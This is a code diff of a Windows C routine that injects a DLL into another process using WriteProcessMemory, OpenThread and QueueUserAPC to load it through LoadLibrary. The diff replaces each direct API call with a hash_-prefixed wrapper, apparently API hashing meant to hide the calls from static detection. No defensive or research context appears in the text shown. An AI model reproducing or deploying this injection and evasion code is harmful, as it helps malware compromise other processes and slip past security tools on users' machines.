@@ -11,13 +11,13 @@ BOOL IsDllInjected(DWORD dwProcessId, LPTSTR DllName)
 	BOOL bFound = FALSE;
 	HANDLE hSnapshot;
 
-	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
+	hSnapshot = hash_CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
 	if (hSnapshot != INVALID_HANDLE_VALUE) {
 
 		MODULEENTRY32 me32;
 		me32.dwSize = sizeof(MODULEENTRY32);
 
-		if (Module32First(hSnapshot, &me32)) {
+		if (hash_Module32FirstW(hSnapshot, &me32)) {
 
 			do {
 
@@ -26,7 +26,7 @@ BOOL IsDllInjected(DWORD dwProcessId, LPTSTR DllName)
 					break;
 				}
 
-			} while (Module32Next(hSnapshot, &me32));
+			} while (hash_Module32NextW(hSnapshot, &me32));
 
 		}
 
@@ -43,7 +43,7 @@ BOOL QueueUserAPC_Injection()
 
 	HANDLE hThreadSnapshot = INVALID_HANDLE_VALUE;
 
-	DWORD dwTargetProcessId, dwCurrentProcessId = GetCurrentProcessId();
+	DWORD dwTargetProcessId, dwCurrentProcessId = hash_GetCurrentProcessId();
 
 	HANDLE hProcess = NULL;
 	HANDLE hThread = NULL;
@@ -97,7 +97,7 @@ BOOL QueueUserAPC_Injection()
 	do { // not a loop
 
 		/* Get the full path of the dll */
-		GetFullPathName(lpDllName, MAX_PATH, lpDllPath, NULL);
+		hash_GetFullPathNameW(lpDllName, MAX_PATH, lpDllPath, NULL);
 		_tprintf(_T("\t[+] Full DLL Path: %s\n"), lpDllPath);
 
 		// The maximum size of the string buffer.
@@ -113,12 +113,12 @@ BOOL QueueUserAPC_Injection()
 
 		/* Write to the remote process */
 		printf("\t[+] Writing into the current process space at 0x%p\n", lpBaseAddress);
-		if (!WriteProcessMemory(hProcess, lpBaseAddress, lpDllPath, WriteBufferSize, NULL)) {
+		if (!hash_WriteProcessMemory(hProcess, lpBaseAddress, lpDllPath, WriteBufferSize, NULL)) {
 			print_last_error(_T("WriteProcessMemory"));
 			break;
 		}
 
-		hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+		hThreadSnapshot = hash_CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
 		if (hThreadSnapshot == INVALID_HANDLE_VALUE)
 			break;
 
@@ -128,14 +128,14 @@ BOOL QueueUserAPC_Injection()
 		//
 		// Brute force threads to find suitable alertable thread for APC injection (if any).
 		//
-		if (Thread32First(hThreadSnapshot, &te32)) {
+		if (hash_Thread32First(hThreadSnapshot, &te32)) {
 			do {
 				if (te32.th32OwnerProcessID == dwTargetProcessId) {
 
-					hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
+					hThread = hash_OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
 					if (hThread) {
 
-						if (QueueUserAPC((PAPCFUNC)LoadLibraryAddress, hThread, (ULONG_PTR)lpBaseAddress)) {
+						if (hash_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, hThread, (ULONG_PTR)lpBaseAddress)) {
 
 							if (IsDllInjected(dwTargetProcessId, lpDllName)) {
 								bStatus = TRUE;
@@ -151,7 +151,7 @@ BOOL QueueUserAPC_Injection()
 					break;
 				}
 
-			} while (Thread32Next(hThreadSnapshot, &te32));
+			} while (hash_Thread32Next(hThreadSnapshot, &te32));
 		}
 
 	} while (FALSE); // not a loop
